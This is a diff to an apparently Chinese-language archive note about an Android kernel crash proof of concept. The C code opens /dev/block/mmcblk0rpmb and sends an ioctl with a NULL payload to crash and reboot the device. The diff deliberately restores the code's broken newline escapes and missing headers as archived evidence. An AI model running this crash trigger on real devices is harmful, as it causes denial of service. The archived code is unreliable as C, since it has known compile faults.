@@ -36,8 +36,8 @@ source_status: "unknown"
 - static command缺显式类型，system/close缺对应头，现代C编译会报错或警告；换行转义丢为n
 - 只有崩溃声明无堆栈/补丁/原始出处
 - 原始 `static command =` 声明按归档保留；它依赖旧式 C 的隐式类型规则，现代编译器及目标 ABI 的适用性未验证，不据排版修订改变其类型。
-- 已落实的文本修订：“#include &lt;stdio.h&gt;”改为“#include &lt;stdio.h&gt; / #include &lt;stdlib.h&gt; / #include &lt;unistd.h&gt;”；“with errno %dn”改为“with errno %d\n”；“payload NULLn”改为“payload NULL\n”；“crash and reboot.n”改为“crash and reboot.\n”；“failed, %dn”改为“failed, %d\n”。上列仍描述旧文问题时，以此落实项及下列限定为准；修订不代表运行验证
-- 本例只支持需要设备节点权限的本地内核崩溃线索，不是普通应用或互联网远程 RCE；仅静态修正 C 类型、头文件和换行转义，未编译或执行。
+- 历史校订意见（原始示例按归档保留，下述改写不再应用于原始示例）：“#include &lt;stdio.h&gt;”改为“#include &lt;stdio.h&gt; / #include &lt;stdlib.h&gt; / #include &lt;unistd.h&gt;”；“with errno %dn”改为“with errno %d\n”；“payload NULLn”改为“payload NULL\n”；“crash and reboot.n”改为“crash and reboot.\n”；“failed, %dn”改为“failed, %d\n”。以上意见置于原始示例之外，不覆盖原文证据；未做运行验证
+- 本例只支持需要设备节点权限的本地内核崩溃线索，不是普通应用或互联网远程 RCE；C 类型、头文件和换行转义的校订意见放在原始示例之外，原代码按归档保留，未编译或执行。
 
 ### 操作风险与恢复
 
@@ -77,8 +77,6 @@ source_status: "unknown"
 * This Poc should run with permission to do ioctl on /dev/block/mmcblk0rpmb.
 */
 #include <stdio.h>
-#include <stdlib.h>
-#include <unistd.h>
 #include <fcntl.h>
 #include <errno.h>
 #include <sys/ioctl.h>
@@ -90,15 +88,15 @@ int main(int argc, char **argv, char **env) {
 int fd = 0;
 fd = open(driver, O_RDWR);
 if (fd < 0) {
-printf("Failed to open %s, with errno %d\n", driver, errno);
+printf("Failed to open %s, with errno %dn", driver, errno);
 system("echo 1 > /data/local/tmp/log");
 return -1;
 }
 
-printf("Try ioctl device file '%s', with command 0x%x and payload NULL\n", driver, command);
-printf("System will crash and reboot.\n");
+printf("Try ioctl device file '%s', with command 0x%x and payload NULLn", driver, command);
+printf("System will crash and reboot.n");
 if(ioctl(fd, command, NULL) < 0) {
-printf("Allocation of structs failed, %d\n", errno);
+printf("Allocation of structs failed, %dn", errno);
 system("echo 2 > /data/local/tmp/log");
 return -1;
 }
